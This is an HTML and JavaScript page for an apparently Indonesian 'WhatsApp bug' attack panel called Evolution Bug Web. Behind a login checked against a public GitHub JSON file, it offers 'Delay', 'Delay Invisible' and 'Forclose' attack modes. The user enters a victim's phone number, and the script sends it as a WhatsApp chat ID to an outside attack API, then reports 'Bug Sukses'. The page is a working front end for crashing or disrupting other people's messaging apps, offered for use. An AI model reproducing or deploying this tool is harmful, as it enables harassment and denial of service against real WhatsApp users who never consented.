<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Evolution Bug Web</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <style>
    :root {
      --main: #ffffff;
      --second: #cccccc;
      --bg: #0e0e0e;
      --text: #eeeeee;
    }
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Orbitron', sans-serif;
    }
    body {
      background: var(--bg);
      color: var(--text);
      min-height: 100vh;
      overflow: hidden;
    }
    #particles-js {
      position: fixed;
      width: 100%;
      height: 100%;
      z-index: 0;
    }
    .container {
      position: relative;
      z-index: 2;
      width: 100%;
      height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }
    .login-box, .main-box {
      background: rgba(255,255,255,0.05);
      border: 1px solid rgba(255,255,255,0.1);
      border-radius: 20px;
      padding: 30px;
      backdrop-filter: blur(10px);
      box-shadow: 0 0 25px rgba(255,255,255,0.2);
      max-width: 500px;
      width: 90%;
      margin: auto;
    }
    .logo-section {
      display: flex;
      align-items: center;
      gap: 15px;
      margin-bottom: 20px;
    }
    .logo-section img {
      width: 60px;
      height: 60px;
      border-radius: 12px;
    }
    .logo-section h1 {
      font-size: 1.2rem;
      color: white;
    }
    input {
      background: rgba(255,255,255,0.05);
      border: 1px solid rgba(255,255,255,0.1);
      border-radius: 12px;
      padding: 12px;
      width: 100%;
      color: white;
      margin: 10px 0;
    }
    button {
      padding: 10px;
      border: none;
      background: var(--main);
      color: black;
      width: 100%;
      font-weight: bold;
      border-radius: 12px;
      cursor: pointer;
      transition: 0.3s;
    }
    button:hover {
      background: #ddd;
    }
    .tabs {
      display: flex;
      justify-content: space-around;
      margin-bottom: 15px;
      border-bottom: 2px solid #ffffff33;
    }
    .tab-btn {
      flex: 1;
      text-align: center;
      padding: 10px;
      cursor: pointer;
      background: rgba(255,255,255,0.05);
      border-radius: 10px 10px 0 0;
      margin: 0 5px;
      transition: 0.3s;
      position: relative;
    }
    .tab-btn.active {
      background: var(--main);
      color: black;
      font-weight: bold;
    }
    .tab-btn.active::after {
      content: "";
      position: absolute;
      bottom: -2px;
      left: 0;
      width: 100%;
      height: 3px;
      background: var(--main);
      border-radius: 3px;
    }
    video {
      width: 100%;
      border-radius: 15px;
      margin-bottom: 20px;
    }
    .status {
      margin-top: 10px;
      text-align: center;
    }
    .floating-result {
      position: fixed;
      top: 20px;
      right: 20px;
      background: rgba(0,0,0,0.8);
      color: white;
      padding: 15px;
      border-radius: 10px;
      z-index: 999;
      display: none;
    }
    .floating-result img {
      width: 50px;
      height: 50px;
      border-radius: 50%;
      margin-right: 10px;
    }
    .floating-result .text {
      display: inline-block;
      vertical-align: top;
      max-width: 200px;
    }
    #loader {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: black;
      z-index: 9999;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    #loader img {
      width: 100px;
      height: auto;
    }
  </style>
</head>
<body>
<div id="loader">
  <img src="https://files.catbox.moe/g33giq.jpeg" alt="loading">
</div>
<div id="particles-js"></div>
<div class="container" style="display:none;" id="main-container">
  <div class="login-box" id="login-box">
    <div class="logo-section">
      <img src="https://files.catbox.moe/g33giq.jpeg" alt="Logo">
      <h1>Welcome To Evolution Web</h1>
    </div>
    <input type="text" id="username" placeholder="Username">
    <input type="password" id="password" placeholder="Password">
    <button onclick="login()">Login</button>
    <div id="login-result" style="text-align:center;margin-top:10px;"></div>
  </div>
  <div class="main-box" id="main-box" style="display:none;">
    <video src="https://files.catbox.moe/bou74n.mp4" autoplay loop muted playsinline></video>
    <div class="tabs">
      <div class="tab-btn active" onclick="setType('delay', this)">Delay</div>
      <div class="tab-btn" onclick="setType('delayinvis', this)">Delay Invisible</div>
      <div class="tab-btn" onclick="setType('spam', this)">Forclose</div>
    </div>
    <input type="text" id="target" placeholder="628xxxx">
    <button onclick="sendBug()">Attack</button>
    <div class="status" id="api-status">Checking API...</div>
  </div>
</div>
<div class="floating-result" id="float-res">
  <img src="https://files.catbox.moe/g33giq.jpeg">
  <div class="text" id="float-text">Loading...</div>
</div>
<audio id="sound-success" src="https://notificationsounds.com/storage/sounds/file-sounds-1157-pristine.mp3"></audio>
<audio id="sound-fail" src="https://notificationsounds.com/storage/sounds/file-sounds-1166-sonar.mp3"></audio>
<script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
<script>
particlesJS("particles-js", {
  particles: { number: { value: 80 }, size: { value: 3 }, move: { speed: 1 }, line_linked: { enable: true } },
  interactivity: { events: { onhover: { enable: true, mode: "repulse" } } }
});

window.onload = () => {
  setTimeout(() => {
    document.getElementById("loader").style.display = "none";
    document.getElementById("main-container").style.display = "flex";
  }, 2000);
  checkAPI();
};

async function login() {
  const u = document.getElementById("username").value;
  const p = document.getElementById("password").value;
  const result = document.getElementById("login-result");
  try {
    const res = await fetch("https://raw.githubusercontent.com/ProjectShenzu/DatabaseEvolution/refs/heads/main/DatabaseWeb.json");
    const json = await res.json();
    if (json.users.some(acc => acc.username === u && acc.password === p)) {
      document.getElementById("login-box").style.display = "none";
      document.getElementById("main-box").style.display = "block";
    } else {
      result.innerText = "Invalid login";
      result.style.color = "crimson";
    }
  } catch (e) {
    result.innerText = "Gagal mengambil data login";
    result.style.color = "crimson";
  }
}

let selectedType = "delay";
function setType(type, el) {
  selectedType = type;
  document.querySelectorAll(".tab-btn").forEach(btn => btn.classList.remove("active"));
  el.classList.add("active");
}

async function sendBug() {
  const t = document.getElementById("target").value;
  if (!t) return alert("Masukkan nomor target");
  showLoadingResult();
  try {
    const res = await fetch(`https://apievolution.gacorr.biz.id/evolution?type=${selectedType}&chatId=${t}@s.whatsapp.net`);
    const json = await res.json();
    setTimeout(() => showResult(json.success === true, t), 1500);
  } catch {
    setTimeout(() => showResult(false, t), 1500);
  }
}

function showLoadingResult() {
  const box = document.getElementById("float-res");
  const text = document.getElementById("float-text");
  text.innerHTML = `⏳ Mengirim bug...`;
  box.style.display = "block";
}

function showResult(success, number) {
  const box = document.getElementById("float-res");
  const text = document.getElementById("float-text");
  text.innerHTML = success ? `<b>✅ Bug Sukses</b><br>Target: ${number}` : `<b>❌ Gagal Kirim</b><br>Target: ${number}`;
  document.getElementById(success ? "sound-success" : "sound-fail").play();
  setTimeout(() => box.style.display = "none", 4000);
}

async function checkAPI() {
  try {
    const res = await fetch("https://apievolution.gacorr.biz.id/status");
    const json = await res.json();
    document.getElementById("api-status").innerText = json.connected ? "✅ Connected" : "❌ Disconnected";
  } catch {
    document.getElementById("api-status").innerText = "❓ Unknown";
  }
  setTimeout(checkAPI, 5000);
}
</script>
</body>
</html>
